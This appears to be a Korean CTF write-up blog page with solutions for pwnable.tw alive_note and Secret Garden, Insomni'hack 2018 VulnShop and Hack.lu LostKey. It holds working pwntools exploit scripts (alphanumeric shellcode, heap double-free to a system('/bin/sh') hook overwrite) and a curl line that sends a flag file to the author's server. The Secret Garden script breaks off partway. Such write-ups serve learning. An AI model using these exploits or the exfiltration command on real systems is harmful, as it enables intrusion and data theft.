<p>만든 alphanumeric 쉘코드는 위와 같다. 우회가 까다로운 부분은 pop ebx와 int 0x80인데 pop ebx는 처음에 popad를 통하여 스택 주소를 넣는 방식으로 우회하였고, int 0x80은 0xff와 xor하는 방식으로 우회하였다. 0xff는 0인 레지스터를 dec하는 방식으로 만들 수 있다.<br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#s = process('/root/alive_note')</span></span><br><span class="line">s = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10300</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(idx,name)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	s.sendline(<span class="string">'1'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> len(name)&lt;<span class="number">8</span>:</span><br><span class="line">		s.sendline(name)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		s.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_note</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	s.sendline(<span class="string">'2'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recvuntil(<span class="string">'Name : '</span>)</span><br><span class="line">	<span class="keyword">return</span> s.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shellcoding</span><span class="params">(sh,idx=<span class="number">-6</span>)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> len(sh)&gt;<span class="number">5</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">"Error"</span></span><br><span class="line">	sh = sh.ljust(<span class="number">5</span>,<span class="string">'\x46'</span>) + <span class="string">'\x71\x39'</span></span><br><span class="line">	add_note(idx,sh)</span><br><span class="line">	add_note(<span class="number">-6</span>,<span class="string">'abcd'</span>)</span><br><span class="line">	add_note(<span class="number">-6</span>,<span class="string">'abcd'</span>)</span><br><span class="line">	add_note(<span class="number">-6</span>,<span class="string">'abcd'</span>)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">shellcoding(<span class="string">'\x52\x52\x52\x54'</span>,<span class="number">-27</span>)</span><br><span class="line">shellcoding(<span class="string">'\x52\x52\x52\x52\x61'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x59\x59\x52\x52\x52'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x68\x4e\x4e\x73\x68'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x58\x66\x35\x61\x61'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x50'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x68\x4e\x62\x69\x6e'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x58\x34\x61\x50\x52'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x52\x52'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x6a\x41\x58\x34\x4a'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x5a\x4a\x31\x51\x42'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x6a\x4e\x5a'</span>)</span><br><span class="line">shellcoding(<span class="string">'\x31\x51\x43'</span>,<span class="number">-5</span>)</span><br><span class="line">shellcoding(<span class="string">'\x5a\x59\x32\x31'</span>)</span><br><span class="line">delete_note(<span class="number">-5</span>)</span><br><span class="line"></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure></p>
<p><br><br></p>
<h3 id="Addition"><a href="#Addition" class="headerlink" title="Addition"></a>Addition</h3><ul>
<li>execve system call을 실행시키는 방법대신 read 실행시켜 shellcode를 입력받는 방법을 이용할 수 있다.</li>
<li>read_int에서 15 byte를 입력받는 것을 이용하여 system(‘/bin/sh’)를 실행시킬 수 있다.</li>
</ul>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/26/Insomni-hack-teaser-2018-VulnShop/">Insomni&#39;hack teaser 2018 - VulnShop</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-26T04:05:09.000Z" itemprop="datePublished">
    2018-01-26
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/web/">Web</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'answer'</span>]) &amp;&amp; <span class="keyword">isset</span>($_REQUEST[<span class="string">'method'</span>]) &amp;&amp; function_exists($_REQUEST[<span class="string">'method'</span>]))&#123; </span><br><span class="line">   $_REQUEST[<span class="string">'method'</span>](<span class="string">"./"</span>.$_SESSION[<span class="string">'challenge'</span>], $_REQUEST[<span class="string">'answer'</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>disabled된 함수인 shell_exec, exec, passthru, mail, proc_open을 제외한 함수를 실행시킬 수 있다. 첫 번째 인자에는 /tmp 에 생성되는 파일 이름이 들어가고, 두번째 인자는 사용자에게 입력받는다.<br><br><br></p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'contactus'</span>: </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;p&gt;You can't contact us for the moment, but it will be available later.&lt;/p&gt;"</span>; </span><br><span class="line">	$_SESSION[<span class="string">'challenge'</span>] = rand(<span class="number">100000</span>,<span class="number">999999</span>); </span><br><span class="line">	<span class="keyword">break</span>; </span><br><span class="line"><span class="keyword">case</span> <span class="string">'captcha'</span>: </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'challenge'</span>])) <span class="keyword">echo</span> $_SESSION[<span class="string">'challenge'</span>]; </span><br><span class="line">    <span class="comment">// Will make an image later </span></span><br><span class="line">    touch($_SESSION[<span class="string">'challenge'</span>]); </span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>먼저 contactus -&gt; captcha를 통해 임시 파일을 하나 생성한다. 생성한 파일은 file_put_contents 함수를 이용해서 파일에 데이터를 쓸 수 있다.<br><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        file_put_contents(<span class="string">'./1234'</span>,<span class="string">"#!/bin/bash\ncurl a/ex.php?data=`cat /flag`"</span>);</span><br><span class="line">        chmod(<span class="string">'./1234'</span>,<span class="string">"511"</span>);</span><br><span class="line">        popen(<span class="string">'./1234'</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>처음에는 require을 통해 php 소스를 불러올려 했는데 2번째 인자 때문에 정상적으로 실행되지 않아서 popen을 통해 공격하였다.<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">curl myweb/ex.php?=`cat flag`</span><br></pre></td></tr></table></figure></p>
<p>위의 스크립트를 file_put_contents 함수를 통해 넣어주고 chmod로 파일 실행 권한을 추가해주면 popen을 통해 실행시킬 수 있다.<br><br><br></p>
<h3 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h3><ul>
<li>curl을 통해 flag를 보내는 방법말고 highlight_file 함수와 두번째 인자를 그냥 null로 주면 파일을 바로 읽어서 출력할 수 있다.</li>
<li>phpinfo에서 session이 저장되는 경로를 알아낼 수 있고, copy 함수로 세션을 조작할 수 있다. 먼저 로컬 환경에서 php 명령어를 저장한 변수($_SESSION[‘challenge’] = ‘vardump(scandir(“$_GET[a]”)))를 session에 저장하고 해당 파일을 출력해 값을 알아낸다. file_put_contents 함수로 로컬에서 얻은 세션 값을 저장하고 문제 사이트의 쿠키 값을 참조하여 copy 함수를 통해 세션을 조작할 수 있다.</li>
</ul>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/24/Hack-lu-CTF-2017-LostKey/">Hack.lu CTF 2017 - LostKey</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-24T04:09:17.000Z" itemprop="datePublished">
    2018-01-24
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/reversing/">Reversing</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v10 &lt; <span class="number">4</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = sub_8061250(esi0, <span class="number">8</span>);</span><br><span class="line">  *(_DWORD *)v3 = <span class="number">16</span> * v10 + <span class="number">135172200</span>;</span><br><span class="line">  *(_DWORD *)(v3 + <span class="number">4</span>) = *(_DWORD *)((<span class="keyword">char</span> *)&amp;tbyte_80E9000 + <span class="number">4</span> * v10 + a2 - <span class="number">135172092</span>);</span><br><span class="line">  esi0 = <span class="number">-4096</span> * (v10 + <span class="number">1</span>) + *(_DWORD *)byte_80E90B8 + dword_80EA3AC;</span><br><span class="line">  v4 = sub_807AE80((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))&amp;tbyte_80E9000, (<span class="keyword">int</span>)off_80E90A8[v10], esi0, <span class="number">273</span>, v3, v7, v8, v9);</span><br><span class="line">  sub_8078550(v4, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  sub_8061710(esi0, v3);</span><br><span class="line">  ++v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4번 루프를 돌면서 argv[1] ~ argv[4]를 하나씩 검사한다. clone으로 자식 프로세스를 만들어서 검사하기 때문에 gdb의 set follow-fork-mode child를 통해 디버깅하였다. <br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( !ptrace(0, 0, 0) )</span><br><span class="line">&#123;</span><br><span class="line">  dword_80EA39C = 0x466C7578;</span><br><span class="line">  dword_80EA3A0 = 0x78756C46;</span><br><span class="line">  dword_80EA3A4 = 0x78756C46;</span><br><span class="line">  dword_80EA3A8 = 0x466C7578;</span><br><span class="line">&#125;</span><br><span class="line">retaddr = sub_804A1F0;</span><br></pre></td></tr></table></figure></p>
<p>특이한 점은 ptrace를 통해 key값을 설정해 argv[4]를 검사하는 루틴에서 사용하였고, rop로 연산이 진행되었다. 그래서 어셈블리 한줄씩 따라가면서 암호화 과정을 분석하였다. 처음 argv[1]은 그냥 key 값과 xor 한 후 비교하는 간단한 암호화였다. argv[1] == ‘flag{Th3’ <br><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encrypt</span></span><br><span class="line">argv[2] -&gt; '12345678abcdefgh'</span><br><span class="line"></span><br><span class="line">enc[<span class="number">0</span>]   = swapbit(!<span class="string">'1'</span> &amp; <span class="number">0xff</span>) ^ <span class="string">'2'</span></span><br><span class="line">enc[<span class="number">1</span>]   = swapbit(!<span class="string">'2'</span> &amp; <span class="number">0xff</span>) ^ <span class="string">'3'</span></span><br><span class="line">..</span><br><span class="line">..</span><br><span class="line">..</span><br><span class="line">enc[n<span class="number">-1</span>] = swapbit(!<span class="string">'g'</span> &amp; <span class="number">0xff</span>) ^ <span class="string">'h'</span></span><br><span class="line">enc[n]   = swapbit(!<span class="string">'h'</span> &amp; <span class="number">0xff</span>) ^ <span class="string">'A'</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># decrypt</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">p = <span class="keyword">lambda</span> x:struct.pack(<span class="string">'I'</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(v)</span>:</span></span><br><span class="line">	t1 = v&lt;&lt;<span class="number">4</span></span><br><span class="line">	t2 = v&gt;&gt;<span class="number">4</span></span><br><span class="line">	<span class="keyword">return</span> (~((t1 | t2)&amp;<span class="number">0xff</span>))&amp;<span class="number">0xff</span></span><br><span class="line">table = [<span class="number">0x37d02c61</span>,<span class="number">0x63979f3b</span>,<span class="number">0xd07e4607</span>,<span class="number">0xad79934a</span>,<span class="number">0xddbdbbca</span>,<span class="number">0x64a669e7</span>]</span><br><span class="line">stable = <span class="string">''</span></span><br><span class="line">flag = <span class="string">'m'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">	stable += p(i)</span><br><span class="line"></span><br><span class="line">stable = stable[::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(stable)):</span><br><span class="line">	flag += chr(enc(ord(stable[i]) ^ ord(flag[i])))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
<p>argv[2] 암호화 과정을 간단하게 표현하면 코드이다. enc[n]에서는 무조건 ‘A’와 xor하기 때문에 뒤에서부터 역연산하여 두번째 flag 조각을 알아낼 수 있다. argv[2] == ‘_key_1s_in_th3_secret_com’ <br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v9 = __ROL4__(v171 + (i ^ v170 &amp; (i ^ v169)) + v6 - <span class="number">680876936</span>, <span class="number">7</span>);</span><br><span class="line">v10 = v9 + v170;</span><br><span class="line">v11 = *v5;</span><br><span class="line">++v5;</span><br><span class="line">v12 = v11;</span><br><span class="line">v13 = __ROL4__(i + (v169 ^ (v9 + v170) &amp; (v169 ^ v170)) + v8 - <span class="number">389564586</span>, <span class="number">12</span>);</span><br><span class="line">v14 = v13 + v10;</span><br><span class="line">v15 = *v5;</span><br><span class="line">++v5;</span><br><span class="line">v16 = v15;</span><br><span class="line">v17 = __ROL4__(v169 + (v170 ^ (v13 + v10) &amp; (v170 ^ v10)) + v12 + <span class="number">606105819</span>, <span class="number">17</span>);</span><br><span class="line">v18 = v17 + v14;</span><br><span class="line">v19 = *v5;</span><br><span class="line">++v5;</span><br><span class="line">v20 = v19;</span><br><span class="line">v21 = __ROL4__(v170 + (v10 ^ (v17 + v14) &amp; (v10 ^ v14)) + v16 - <span class="number">1044525330</span>, <span class="number">22</span>);</span><br><span class="line">v22 = v21 + v18;</span><br><span class="line">v23 = *v5;</span><br><span class="line">++v5;</span><br><span class="line">v24 = v23;</span><br><span class="line">v25 = __ROL4__(v10 + (v14 ^ (v21 + v18) &amp; (v14 ^ v18)) + v20 - <span class="number">176418897</span>, <span class="number">7</span>);</span><br><span class="line">v26 = v25 + v22;</span><br><span class="line">v27 = *v5;</span><br></pre></td></tr></table></figure></p>
<p>이제 argv[3]의 암호화 과정을 분석하기 위해 rwatch 명령어로 argv[3]에 브포를 걸고 연산하는 부분을 찾아가 보았더니, 상당히 복잡한 과정을 통해 암호화가 진행되었다. z3를 통해 해결하려고 했지만 암호화 과정을 처음부터 어셈으로 구현해서 그런지 hex-ray로 디컴파일된 소스가 정확하지 않았다. 알고보니 md5 hash과정을 어셈블리로 구현한 것임을 알고 hash killer를 통해 알아내었다. argv[3] == ‘p4rtme’<br><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( !ptrace(0, 0, 0) )</span><br><span class="line">&#123;</span><br><span class="line">  dword_80EA39C = 0x466C7578;</span><br><span class="line">  dword_80EA3A0 = 0x78756C46;</span><br><span class="line">  dword_80EA3A4 = 0x78756C46;</span><br><span class="line">  dword_80EA3A8 = 0x466C7578;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>프로세스마다 ptrace를 이용해 key값을 만들어주는데 마지막 argv[4]를 암호화할때 사용되었다. 처음에 key를 구하기 힘들어서 복호화를 못했는데 ida를 통해 모든 프로세스의 연산이 끝난 후에 key 값을 확인하여 정확한 key를 구하였다. 한번에 8byte씩 총 3번 암호화가 진행되었다. <br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> str[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> table[] = &#123;<span class="number">0xa42d6ebf</span>, <span class="number">0xefe89e7</span>, <span class="number">0xaadd934d</span>, <span class="number">0x4e4e7f13</span>, <span class="number">0x8ec32ca9</span>, <span class="number">0x8559d4e9</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> d,<span class="keyword">unsigned</span> <span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ebx=<span class="number">0</span>,edi,esi,ecx,i;</span><br><span class="line">	edi = d;</span><br><span class="line">	esi = s;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">		ebx = ebx + <span class="number">0x9e3779b9</span>;</span><br><span class="line">		ecx = (esi &lt;&lt; <span class="number">4</span>) + <span class="number">0xc2e1faff</span>;</span><br><span class="line">		ecx = ecx ^ (esi + ebx);</span><br><span class="line">		ecx = ecx ^ ((esi&gt;&gt;<span class="number">5</span>) + <span class="number">0xfffae1c2</span>);</span><br><span class="line">		edi = ecx + edi;</span><br><span class="line">		ecx = edi;</span><br><span class="line">		</span><br><span class="line">		ecx = (ecx&lt;&lt;<span class="number">4</span>) + <span class="number">0xfffae1c2</span>;</span><br><span class="line">		ecx = ecx ^ (edi + ebx);</span><br><span class="line">		ecx = ecx ^ ((edi&gt;&gt;<span class="number">5</span>) + <span class="number">0xc2e1faff</span>);</span><br><span class="line">		</span><br><span class="line">		esi = esi + ecx;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%x %x\n"</span>,edi,esi);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> d, <span class="keyword">unsigned</span> <span class="keyword">int</span> s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ebx,edi,esi,ecx,i;</span><br><span class="line">	edi = d;</span><br><span class="line">	esi = s;</span><br><span class="line">	ebx = <span class="number">0xc6ef3720</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">		ecx = edi;</span><br><span class="line">	</span><br><span class="line">		ecx = (ecx&lt;&lt;<span class="number">4</span>) + <span class="number">0xfffae1c2</span>;</span><br><span class="line">		ecx = ecx ^ (edi + ebx);</span><br><span class="line">		ecx = ecx ^ ((edi &gt;&gt; <span class="number">5</span>) + <span class="number">0xc2e1faff</span>);</span><br><span class="line">		esi = esi - ecx;</span><br><span class="line"></span><br><span class="line">		ecx = (esi &lt;&lt; <span class="number">4</span>) + <span class="number">0xc2e1faff</span> ;</span><br><span class="line">		ecx = ecx ^ (esi + ebx);</span><br><span class="line">		ecx = ecx ^ ((esi&gt;&gt;<span class="number">5</span>) + <span class="number">0xfffae1c2</span>);</span><br><span class="line">		edi = edi - ecx;</span><br><span class="line">		ebx = ebx - <span class="number">0x9e3779b9</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	str[<span class="number">0</span>] = edi;</span><br><span class="line">	str[<span class="number">1</span>] = esi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">		decrypt(table[i*<span class="number">2</span>],table[i*<span class="number">2</span>+<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%s"</span>,str);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>rop로 구현된 암호화 과정을 c 소스로 바뀐 뒤 복호화하였다. argv[4] == ‘nt_of_your_t00l_sh3d…}’</p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/20/Pwnable-tw-Secret-Garden/">Pwnable.tw - Secret Garden</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-20T12:21:37.000Z" itemprop="datePublished">
    2018-01-20
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/pwnable/">Pwnable</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// remove_flower function</span></span><br><span class="line"> __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">99</span> &amp;&amp; (v5 = flower_list[v7]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">      *v5 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(flower_list[v7] + <span class="number">8L</span>L));           <span class="comment">// double free</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>취약점은 remove_flower에서 발생한다. flower가 이미 free 되었는지 검사를 하지 않기 때문에 여러번 free 시킬 수 있다.<br><br><br></p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// raise_flower function</span></span><br><span class="line"> __printf_chk(<span class="number">1L</span>L, <span class="string">"The name of flower :"</span>, v3, v4);</span><br><span class="line"> read(<span class="number">0</span>, name, *size);</span><br></pre></td></tr></table></figure>
<p>flower의 이름을 read로 입력받고 null 바이트를 끝에 불여주지 않는다. unsorted bin의 주소를 leak하여 libc 주소를 알아낼 수 있다.fastbin dup 공격을 통해 malloc_hook 를 oneshot 주소로 바꿀려고 했지만, oneshot 조건에 걸려서 free_hook를 system 주소로 바꾸고 system(‘/bin/sh’)을 실행시키기로 하였다. 그런데 문제를 풀고 나서 확인해보니 malloc_hook를 oneshot 주소로 바꾸는 방법이 가능하였다… <br><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//malloc.c - 3582</span></span><br><span class="line">  <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br></pre></td></tr></table></figure></p>
<p>fastbin dup 공격이 성공하기 위해서는 fastbin index 검사를 우회하여야 한다. 변조한 fd인 victim의 사이즈가 fastbin chunk size 이여야하는데 free_hook 주변에는 모두 null이여서 바로 fastbin dup 공격을 하지 못하고 unsortbin bin attack을 통해 free_hook 조금 앞에 unsorted bin의 주소를 넣고 0x7f를 fastbin chunk 사이즈로 사용해 검사를 우회하였다.(__free_hook 앞 공간이 printf, scanf 함수가 실행되고 나면 모두 null로 초기화되서 free_hook - 0x1D를 fake chunk로 사용해야함) unsortbin bin attack 역시 fastbin dup를 통해 bk를 변조하였다.<br><br><br></p>
<h3 id="Exploit-py"><a href="#Exploit-py" class="headerlink" title="Exploit.py"></a>Exploit.py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10203</span>)</span><br><span class="line">libc = ELF(<span class="string">'/root/libc_64.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">raise_flower</span><span class="params">(length,name,color)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	s.sendline(<span class="string">'1'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(length))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> length&gt;<span class="number">0</span>:</span><br><span class="line">		s.send(name)</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_garden</span><span class="params">()</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	s.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_flower</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean_garden</span><span class="params">()</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">	s.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Leak</span></span><br><span class="line">raise_flower(<span class="number">0x200</span>,<span class="string">'a'</span>*<span class="number">0x200</span>,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">0x200</span>,<span class="string">'a'</span>*<span class="number">0x200</span>,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">40</span>,<span class="string">'a'</span>*<span class="number">40</span>,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(<span class="number">10</span>,<span class="string">'1'</span>*<span class="number">10</span>,<span class="string">'red'</span>)</span><br><span class="line">remove_flower(<span class="number">0</span>)</span><br><span class="line">remove_flower(<span class="number">1</span>)</span><br><span class="line">remove_flower(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">raise_flower(<span class="number">0</span>,<span class="string">''</span>,<span class="string">'red'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">s.sendline(<span class="string">'2'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Name of the flower[4] :'</span>)</span><br><span class="line">libc_leak = u64(s.recvn(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">libc_base = libc_leak - <span class="number">0x3C3D78</span></span><br><span class="line">libc_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">remove_flower(<span class="number">4</span>)</span><br><span class="line">raise_flower(<span class="number">8</span>,<span class="string">'1'</span>*<span class="number">8</span>,<span class="string">'red'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Your choice : '</span>)</span><br><span class="line">s.sendline(<span class="string">'2'</span>)</span><br><span class="line">s.recvuntil(<span class="string">'Name of the flower[5] :'</span>+<span class="string">'1'</span>*<span class="number">8</span>)</span><br><span class="line">heap_leak = u64(s.recvn(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">heap_base = heap_leak - <span class="number">0x1280</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base  : "</span>+hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_hook  : "</span>+hex(libc_hook)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base  : "</span>+hex(heap_base)</span><br><span class="line"></span><br><span class="line">remove_flower(<span class="number">3</span>)</span><br><span class="line">remove_flower(<span class="number">5</span>)</span><br><span class="line">clean_garden()</span><br><span class="line"></span><br><span class="line"><span class="comment">### Unsorted bin attack using fastbin dup</span></span><br><span class="line">SIZE = <span class="number">0x60</span></span><br><span class="line">raise_flower(<span class="number">0x10</span>,p64(<span class="number">0x7f</span>)*<span class="number">2</span>,<span class="string">'red'</span>) </span><br><span class="line">raise_flower(<span class="number">0x150</span>,<span class="string">'b'</span>*<span class="number">0x150</span>,<span class="string">'red'</span>)</span><br><span class="line"></span><br><span class="line">raise_flower(SIZE,<span class="string">'a'</span>*SIZE,<span class="string">'red'</span>)</span><br><span class="line">raise_flower(SIZE,<span class="string">'b'</span>*SIZE,<span class="string">'red'</span>)</span><br><span 